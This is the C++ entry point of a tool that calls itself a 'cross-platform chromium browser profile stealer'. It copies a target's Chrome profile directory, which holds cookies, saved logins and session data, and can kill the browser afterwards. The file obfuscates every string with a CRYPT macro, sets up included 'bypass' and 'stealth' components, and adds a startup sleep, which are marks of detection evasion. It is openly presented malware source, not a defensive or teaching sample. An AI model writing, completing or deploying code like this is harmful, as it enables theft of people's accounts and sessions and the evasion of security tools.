#include <CLI/CLI.hpp>
#include "src/bypass_methods/bypass.hpp"
#include "src/app/context.h"
#include "src/stealth/encryption.hpp"

int main(int argc, char** argv) {
    Context ctx;
    CLI::App cli{ CRYPT("cross-platform chromium browser profile stealer") };
    cli.require_subcommand(1);
    cli.fallthrough();
    cli.add_flag(CRYPT("--verbose"), ctx.out.verbose, CRYPT("enable verbose output"));
    cli.add_option(CRYPT("--log-file"), ctx.out.logPath, CRYPT("enables output logging to the specified file"));
    cli.add_option(CRYPT("--profile"), ctx.profileDirectory, CRYPT("Full path to the root profile you want to copy. (e.g: -p 'C:\\Users\\drew\\AppData\\Local\\Google\\Chrome\\User\\Default')"))
        ->required();
    cli.add_flag(CRYPT("-k,--kill"), ctx.kill,
        CRYPT("kill the launched browser after all profile files are downloaded."));
    BypassMethod bypass;
    bypass.setup(cli, ctx);
    sleepMs();
    CLI11_PARSE(cli, argc, argv);
    return 0;
}